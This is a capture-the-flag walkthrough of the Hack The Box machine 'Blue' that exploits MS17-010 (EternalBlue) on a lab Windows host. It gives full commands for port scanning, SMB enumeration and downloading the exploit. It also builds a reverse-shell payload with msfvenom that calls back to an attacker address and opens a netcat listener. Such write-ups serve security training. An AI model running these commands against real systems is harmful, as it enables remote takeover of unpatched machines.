# Blue 

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Blue)  [2](https://app.hackthebox.com/machines/Blue)

**Machine ip:** 10.10.10.40

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a8b31b09-f318-49b3-a8b6-0faa07b52c0d)


# Sections
+ [Reconnaissance](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/39_Blue.md#reconnaissance)
+ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/39_Blue.md#enumeration)
+ [Exploitation & Gaining Access & Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/39_Blue.md#exploitation--gaining-access--privilege-escalation)
+ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/39_Blue.md#links)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.40 -e tun0 > ports

sort -n -k4 ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.40 --open

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/541cf98d-1908-45af-a6ea-4bfc302fdf55)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1acc49b7-1b38-4c2f-8f43-2c7d42f91b00)


## Enumeration
```
nmap --script vuln 10.10.10.40
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/be27653c-bed5-41e6-bf76-9b531c32a044)

```
smbmap -H 10.10.10.40 -u guest -p ''

smbclient //10.10.10.40/share

smbclient //10.10.10.40/users
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/19694aa3-0564-4de5-b490-bd57dd9f1df0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e9cef959-7fd1-4f26-8943-d5097d0ca541)


## Exploitation & Gaining Access & Privilege Escalation

### Method 1: [CVE-2017-0144](https://www.exploit-db.com/exploits/42315) - Manual Solution
```
searchsploit ms17-010

searchsploit -m 42315

mv 42315.py ms17-010.py
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ff3583a-8c7e-46f7-a6b0-27fbd1a5692b)

Modify username as **guest** in the below python exploit code:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74f3513b-14eb-452e-98ba-2dd5bd2117da)

Uncomment two lines, update the exploit code with the reverse shell executable location and get the script to execute it:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7eb03635-3cf3-4bef-b318-aa69bb2263f0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/521a14ec-bd35-4563-af1e-a7e350f62e53)

```
# On kali attack machine:
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.24 LPORT=4444 -o ms17-010.exe

nc -lnvp 4444

python2 ms17-010.py 10.10.10.40

# On the target machine:
whoami
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1dadd00f-e06d-4a7b-8a2d-b6a4c02286d0)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b30f7bd-8ec0-4e8b-902b-78ed57b5660b)


### Method 2: [CVE-2017-0144](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) - Metasploit Solution
+ Try with metasploit solution [1](https://ethicalhacs.com/blue-hackthebox-walkthrough/) [2](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) [3](https://0xdf.gitlab.io/2021/05/11/htb-blue.html#metasploit) [4](https://u1sp00kies.medium.com/hack-the-box-htb-blue-walkthrough-7dac9505bc9c)


### Method 3: [CVE-2017-0143](https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script) Manual Solution is the same as on [Legacy Machine's Method 2](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/38_Legacy.md#method-2-cve-2017-0143-ms17-010--eternal-blue--shadow-brokers--wannacry--notpetya-1-2-3)
+ Try **CVE-2017-0143** [1](https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script) [2](https://systemweakness.com/hacktheboxs-blue-writeup-8f1d51c70c46) [3](https://systemweakness.com/hackthebox-writeup-blue-1e07a98ae505#4f92)

---

# Links

# References & Alternatives
+ https://vvmlist.github.io/#blue
+ https://medium.com/@dw3113r/hack-the-box-blue-writeup-without-metasploit-1c6f7e3c586c
  + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/blue-writeup-w-o-metasploit
+ https://ethicalhacs.com/blue-hackthebox-walkthrough/
  + https://0xdf.gitlab.io/2021/05/11/htb-blue.html
  + https://systemweakness.com/hacktheboxs-blue-writeup-8f1d51c70c46
  + https://systemweakness.com/hackthebox-writeup-blue-1e07a98ae505
  + https://www.hackingarticles.in/hack-the-box-challenge-blue-walkthrough/


## CVE Scripting
+ **CVE-2017-0144 / ms17-010 / Eternal Blue / Shadow Brokers / WannaCry / NotPetya:** https://www.exploit-db.com/exploits/42315
    + https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  + https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
+ **CVE-2017-0143 / ms17-010 / Eternal Blue / Shadow Brokers / WannaCry / NotPetya:** https://www.exploit-db.com/exploits/43970
    + https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  + https://github.com/helviojunior/MS17-010
    + https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
  + https://github.com/c0d3cr4f73r/MS17-010_CVE-2017-0143
  + https://github.com/worawit/MS17-010
  + https://github.com/3ndG4me/AutoBlue-MS17-010


## Tools
+ **mysmb.py:** https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
  + https://github.com/worawit/MS17-010
+ **impacket:** https://github.com/fortra/impacket


## Technical Knowledge
+ **139,445 - Pentesting SMB:** https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
  + https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+ **how to exploit the Eternal Blue vulnerability without using Metasploit:** https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/


## Problems Solution: The same as on [Legacy Machine's Problems Solution](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/38_Legacy.md#problems-solution)
+ https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script
+ [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
+ [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)
+ https://unix.stackexchange.com/questions/654723/cant-install-python2-modules-kali-2020


## For More
+ https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
+ https://msrc.microsoft.com/blog/2017/05/customer-guidance-for-wannacrypt-attacks/
+ https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/
+ **Shadow Brokers:** https://en.wikipedia.org/wiki/The_Shadow_Brokers
+ **WannaCry ransomware attack:** https://en.wikipedia.org/wiki/WannaCry_ransomware_attack
  + https://darknetdiaries.com/episode/73/
+ https://cwe.mitre.org/data/definitions/680.html
+ https://andyrussellcronin.wordpress.com/2012/04/13/understanding-heap-spraying/
+ https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/
